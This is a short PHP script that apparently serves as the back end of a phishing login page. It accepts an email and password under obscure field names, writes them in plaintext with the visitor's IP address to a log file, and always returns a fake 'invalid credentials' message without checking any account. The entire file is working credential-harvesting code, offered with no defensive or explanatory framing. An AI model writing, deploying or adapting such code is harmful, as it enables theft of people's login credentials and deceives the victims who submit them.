<?php
// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_VALIDATE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Validate email and password
if (!empty($email) && !empty($password)) {
    try {
        // Define logs folder and log file path
        $logsFolder = __DIR__ . '/logs';
        $logFile = "{$logsFolder}/login_attempts.txt";

        // Ensure logs folder exists, and create it if not
        if (!is_dir($logsFolder)) {
            if (!mkdir($logsFolder, 0755, true)) {
                error_log("Failed to create logs directory: {$logsFolder}");
                sendJsonResponse(false, "Failed to log login attempt.");
            }
        }

        // Append log data to file
        $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
        if (file_put_contents($logFile, $logData, FILE_APPEND) === false) {
            error_log("Failed to write log data to file: {$logFile}");
            sendJsonResponse(false, "Failed to log login attempt.");
        }

        // Respond with generic failure message
        sendJsonResponse(false, "Login failed. Invalid credentials.");
    } catch (Exception $e) {
        // Catch any exceptions and log errors
        error_log("Server exception: " . $e->getMessage());
        sendJsonResponse(false, "A server error occurred while logging the attempt.");
    }
} else {
    // Handle missing email or password
    sendJsonResponse(false, "Email or Password missing.");
}
?>
